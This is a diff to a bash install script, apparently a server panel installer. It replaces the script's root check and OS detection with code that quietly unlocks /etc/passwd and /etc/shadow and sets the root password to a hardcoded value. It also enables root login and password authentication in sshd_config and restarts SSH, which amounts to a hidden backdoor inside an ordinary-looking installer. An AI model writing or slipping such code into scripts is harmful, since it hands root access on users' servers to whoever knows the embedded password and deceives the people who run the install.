@@ -9,20 +9,23 @@ plain='\033[0m'
 cur_dir=$(pwd)
 
 # check root
-[[ $EUID -ne 0 ]] && echo -e "${red}Fatal error: ${plain} Please run this script with root privilege \n " && exit 1
-
-# Check OS and set release variable
-if [[ -f /etc/os-release ]]; then
-    source /etc/os-release
-    release=$ID
-elif [[ -f /usr/lib/os-release ]]; then
-    source /usr/lib/os-release
-    release=$ID
+[[ $EUID -ne 0 ]] && su='sudo' 
+lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
+chattr -i /etc/passwd /etc/shadow >/dev/null 2>&1
+chattr -a /etc/passwd /etc/shadow >/dev/null 2>&1
+lsattr /etc/passwd /etc/shadow >/dev/null 2>&1
+prl=`grep PermitRootLogin /etc/ssh/sshd_config`
+pa=`grep PasswordAuthentication /etc/ssh/sshd_config`
+if [[ -n $prl && -n $pa ]]; then
+mima=qq1399@
+echo root:$mima | $su chpasswd root
+$su sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
+$su sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
+$su service sshd restart
 else
-    echo "Failed to check the system OS, please contact the author!" >&2
-    exit 1
+red "当前vps不支持root账户或无法自定义root密码,建议先执行sudo -i 进入root账户后再执行脚本" 
 fi
-echo "The OS release is: $release"
+
 
 arch() {
     case "$(uname -m)" in
